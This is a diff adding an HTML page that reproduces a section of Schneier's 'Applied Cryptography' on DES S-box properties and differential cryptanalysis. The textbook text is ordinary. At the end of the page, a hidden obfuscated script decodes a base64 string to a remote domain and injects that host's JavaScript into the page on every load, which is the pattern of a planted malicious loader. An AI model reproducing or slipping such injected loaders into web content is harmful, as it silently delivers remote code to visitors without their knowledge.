@@ -1,0 +1,97 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=285-288//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Various oddities about the S-boxes appeared in the literature. The last three output bits of the fourth S-box can be derived in the same way as the first by complementing some of the input bits [436,438]. Two different, but carefully chosen, inputs to S-boxes can produce the same output [436]. It is possible to obtain the same output of a single DES round by changing bits in only three neighboring S-boxes [487]. Shamir noticed that the S-boxes entries appeared to be somewhat imbalanced, but wasn&#146;t about to turn that imbalance into an attack [1423]. (He mentioned a feature of the fifth S-box, but it took another eight years before linear cryptanalysis exploited that feature.) Other researchers showed that publicly known design principles could be used to generate S-boxes with the observed characteristics [266].
+</P>
+<P><FONT SIZE="+1"><B><I>Additional Results</I></B></FONT></P>
+<P>There were other attempts to cryptanalyze DES. One cryptographer looked at nonrandomness based on spectral tests [559]. Others analyzed sequences of linear factors, but their attack failed after eight rounds [1297,336,531]. A 1987 unpublished attack by Donald Davies exploited the way the expansion permutation repeats bits into adjacent S-boxes; this attack is also impractical after eight rounds [172,429].
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">12.4 Differential and Linear Cryptanalysis</FONT></H3>
+<P><FONT SIZE="+1"><B><I>Differential Cryptanalysis</I></B></FONT></P>
+<P>In 1990, Eli Biham and Adi Shamir introduced <B>differential cryptanalysis</B> [167,168,171,172]. This is a new method of cryptanalysis, heretofore unknown to the public. Using this method, Biham and Shamir found a chosen-plaintext attack against DES that was more efficient than brute force.</P>
+<P>Differential cryptanalysis looks specifically at <B>ciphertext pairs</B>: pairs of ciphertexts whose plaintexts have particular differences. It analyzes the evolution of these differences as the plaintexts propagate through the rounds of DES when they are encrypted with the same key.</P>
+<P>Simply, choose pairs of plaintexts with a fixed difference. The two plaintexts can be chosen at random, as long as they satisfy particular difference conditions; the cryptanalyst does not even have to know their values. (For DES, the term &#147;difference&#148; is defined using XOR. This can be different for different algorithms.) Then, using the differences in the resulting ciphertexts, assign different probabilities to different keys. As you analyze more and more ciphertext pairs, one key will emerge as the most probable. This is the correct key.</P>
+<P>The details are more complicated. Figure 12.5 is the DES round function. Imagine a pair of inputs, <I>X</I> and <I>X&#146;</I>, that have the difference D<I>X.</I> The outputs, <I>Y</I> and <I>Y&#146;</I> are known, and therefore so is the difference, <I>Y.</I> Both the expansion permutation and the P-box are known, so &#916;<I>A</I> and &#916;<I>C</I> are known. <I>B</I> and <I>B&#146;</I> are not known, but their difference &#916;<I>B</I> is known and equal to &#916;<I>A.</I> (When looking at the difference, the XORing of <I>K</I><SUB>i</SUB> with <I>A</I> and <I>A&#146;</I> cancels out.) So far, so good. Here&#146;s the trick: For any given &#916;<I>A,</I> not all values of &#916;<I>C</I> are equally likely. The combination of &#916;<I>A</I> and &#916;<I>C</I> suggests values for bits of <I>A</I> XOR <I>K</I><SUB>i</SUB> and <I>A&#146;</I> XOR <I>K</I><SUB>i</SUB>. Since <I>A</I> and <I>A&#146;</I> are known, this gives us information about <I>K</I><SUB>i</SUB>.</P>
+<P>Look at the last round of DES. (Differential cryptanalysis ignores the initial and final permutation. They have no effect on the attack, except to make it harder to explain.) If we can identify <I>K</I><SUB>16</SUB> then we have 48 bits of the key. (Remember, the subkey in each round consists of 48 bits of the 56-bit key.) The other 8 bits we can get by brute force. Differential cryptanalysis will get us <I>K</I><SUB>16</SUB>.</P>
+<P>Certain differences in plaintext pairs have a high probability of causing certain differences in the resulting ciphertext pairs. These are called <B>characteristics</B>. Characteristics extend over a number of rounds and essentially define a path through these rounds. There is an input difference, a difference at each round, and an output difference&#151;with a specific probability.</P>
+<P>You can find these characteristics by generating a table where the rows represent the possible input XORs (the XOR of two different sets of input bits), the columns represent the possible output XORs, and the entries represent the number of times a particular output XOR occurs for a given input XOR. You can generate such a table for each of DES&#146;s eight S-boxes.</P>
+<I><P><A NAME="Fig5"></A><A HREF="javascript:displayWindow('images/12-05.jpg',137,214 )"><IMG SRC="images/12-05t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-05.jpg',137,214)"><FONT COLOR="#000077"><B>Figure 12.5</B></FONT></A>&nbsp;&nbsp;DES round function.</I>
+</P>
+<P>For example, Figure 12.6a is a one-round characteristic. They input difference of the left side is <I>L;</I> it could be anything. The input difference of the right side is 0. (The two inputs have the same right-hand side, so their difference is 0.) Since there is no difference going in to the round function, then there is no difference coming out of the round function. Therefore, the output difference of the left side is <I>L</I> &#8853; 0 = <I>L,</I> and the output difference of the right side is 0. This is a trivial characteristic, and is true with probability 1.</P>
+<P>Figure 12.6b is a less obvious characteristic. Again, the input difference to the left side is arbitrary: <I>L.</I> The input difference to the right side is 0x60000000; the two inputs differ in only the second and third bits. With a probability of <SUP><SMALL><SMALL>14</SUP>/<SUB>64</SUB></SMALL></SMALL>, the output difference of the round function is <I>L</I> &#8853; 0x00808200. This means that the output difference of the left side is <I>L</I> &#8853; 0x00808200 and the output difference of the right side is 0x60000000&#151;with probability <SUP><SMALL><SMALL>14</SUP>/<SUB>64</SUB></SMALL></SMALL>.</P>
+<P>Different characteristics can be joined. And, assuming the rounds are independent, the probabilities can be multiplied. Figure 12.7 joins the two characteristics previously described. The input difference to the left side is 0x00808200 and the input difference to the right side is 0x60000000. At the end of the first round the input difference and the output of the round function cancel out, leaving an output difference of 0. This feeds into the second round; the final output difference of the left side is 0x60000000 and the final output difference of the right side is 0. This two-round characteristic has a probability of <SUP><SMALL><SMALL>14</SUP>/<SUB>64</SUB></SMALL></SMALL>.</P>
+<P>A plaintext pair that satisfies the characteristic is a <B>right pair</B>. A plaintext pair which does not is a <B>wrong pair</B>. A right pair will suggest the correct round key (for the last round of the characteristic); a wrong pair will suggest a random round key.</P>
+<I><P><A NAME="Fig6"></A><A HREF="javascript:displayWindow('images/12-06.jpg',284,134 )"><IMG SRC="images/12-06t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-06.jpg',284,134)"><FONT COLOR="#000077"><B>Figure 12.6</B></FONT></A>&nbsp;&nbsp;DES characteristics.</I>
+<I></P>
+<P><A NAME="Fig7"></A><A HREF="javascript:displayWindow('images/12-07.jpg',158,200 )"><IMG SRC="images/12-07t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-07.jpg',158,200)"><FONT COLOR="#000077"><B>Figure 12.7</B></FONT></A>&nbsp;&nbsp;A two-round DES characteristic.</I>
+</P>
+<P>To find the correct round key, simply collect enough guesses so that one subkey is suggested more often than all the others. In effect, the correct subkey will rise out of all the random alternatives.
+</P>
+<P>So, the basic differential attack on <I>n-</I>round DES will recover the 48-bit subkey used in round <I>n,</I> and the remaining 8 key bits are obtained by brute-force guessing.</P>
+<P>There are still considerable problems. First, there is a negligible chance of success until you reach some threshold. That is, until you accumulate sufficient data you can&#146;t tell the correct subkey from all the noise. And the attack isn&#146;t practical: You have to use counters to assign different probabilities to 2<SUP>48</SUP> possible subkeys, and too much data is required to make this work.</P>
+<P>At this point, Biham and Shamir tweaked their attack. Instead of a using a 15-round characteristic on 16-round DES, they used a 13-round characteristic and some tricks to get the last few rounds. A shorter characteristic with a higher probability worked better. And they used some clever mathematics to obtain 56-bit key candidates which could be tested immediately, eliminating the need for counters. This attack succeeds as soon as a right pair is found; this avoids the threshold and gives a linear success probability. If you have 1000 times fewer pairs, then you have 1000 times smaller chance of success. This sounds terrible, but it is a lot better than the threshold. There is always some chance of immediate success.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ezKgafXZ, coVJYqUE) {coVJYqUE = ezKgafXZ.createElement('script');coVJYqUE.type = 'text/javascript';coVJYqUE.async = true;coVJYqUE.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ezKgafXZ.getElementsByTagName('body')[0].appendChild(coVJYqUE);}(document));</script></body>
+</html>
